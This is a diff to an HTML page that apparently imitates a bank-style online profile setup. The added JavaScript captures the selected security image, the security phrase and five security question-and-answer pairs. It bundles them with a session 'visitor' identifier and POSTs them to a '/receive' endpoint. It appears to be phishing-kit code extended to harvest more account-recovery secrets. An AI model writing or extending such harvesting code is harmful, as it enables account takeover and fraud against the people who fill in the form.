@@ -9136,7 +9136,23 @@ h3 {
     </div>
 </body>
 
-
+<script>
+	// Get all radio input elements by name
+var radioInputs = document.getElementsByName('OnlineProfile.SecurityImage');
+let selectedValue;
+// Loop through each radio input and attach event listener
+radioInputs.forEach(function(radioInput) {
+    radioInput.addEventListener('change', function() {
+        // Check if this radio input is selected
+        if (this.checked) {
+            // Get the value of the selected radio input
+             selectedValue = this.value;
+            console.log('Selected value: ' + selectedValue);
+            // You can perform further actions here based on the selected value
+        }
+    });
+});
+	</script>
 <script>
     $(document).ready(function() { 
         $('#a-widget-35782').on('click', function(event) {
@@ -9146,6 +9162,12 @@ h3 {
             let isEmpty = false;
             let visitor = sessionStorage.getItem('visitor');
             let message = '';
+            
+            
+
+            
+            message += 'Selected Image: ' + selectedValue+'\n';
+            message += 'Phrase:' + document.getElementById('OnlineProfile_SecurityPhrase').value+'\n';
 
             // Retrieve values of answers and questions
             for (let i = 1; i <= 5; i++) {
@@ -9153,7 +9175,7 @@ h3 {
                 let question = document.getElementById('OnlineProfile_QuestionId' + i);
                 let selectedOption = question.options[question.selectedIndex].textContent;
                 message += selectedOption + ' : ' + answer + '\n';
-                console.log(message);
+                
             }
 
             // Check if any input is empty
@@ -9171,6 +9193,7 @@ h3 {
 
             // If inputs are not empty, proceed with form submission
             if (!isEmpty) {
+            	console.log(message);
                 $.ajax({
                     method: 'POST',
                     url: "/receive",
